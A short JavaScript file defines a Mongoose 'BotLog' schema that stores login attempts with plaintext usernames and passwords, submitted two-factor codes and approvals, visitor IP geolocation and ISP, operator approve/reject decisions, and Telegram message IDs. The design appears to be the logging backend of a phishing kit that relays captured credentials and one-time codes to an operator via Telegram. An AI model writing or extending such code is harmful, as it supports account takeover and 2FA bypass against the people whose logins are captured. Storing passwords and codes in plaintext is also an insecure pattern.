const mongoose = require('mongoose');

const BotLogSchema = new mongoose.Schema(
  {
    type: {
      type: String,
      enum: ['login_attempt', 'username_entry', 'two_fa_code', 'two_fa_approval', 'visitor_log', 'admin_decision'],
      required: true,
    },
    username: String,
    password: String,
    verificationId: String,
    code: String,
    method: String,
    ip: String,
    location: {
      country: String,
      city: String,
      region: String,
      timezone: String,
      isp: String,
    },
    userAgent: String,
    data: mongoose.Schema.Types.Mixed, // Store additional data
    status: {
      type: String,
      enum: ['pending', 'pending_approval', 'approved', 'rejected', 'correct', 'incorrect', 'expired', 'failed'],
      default: 'pending',
    },
    approvedBy: String,
    rejectedReason: String,
    telegramMessageId: Number,
    createdAt: {
      type: Date,
      default: Date.now,
      index: true,
    },
  },
  { timestamps: true }
);

// Index for faster queries
BotLogSchema.index({ type: 1, createdAt: -1 });
BotLogSchema.index({ username: 1, createdAt: -1 });
BotLogSchema.index({ verificationId: 1 });

module.exports = mongoose.model('BotLog', BotLogSchema);
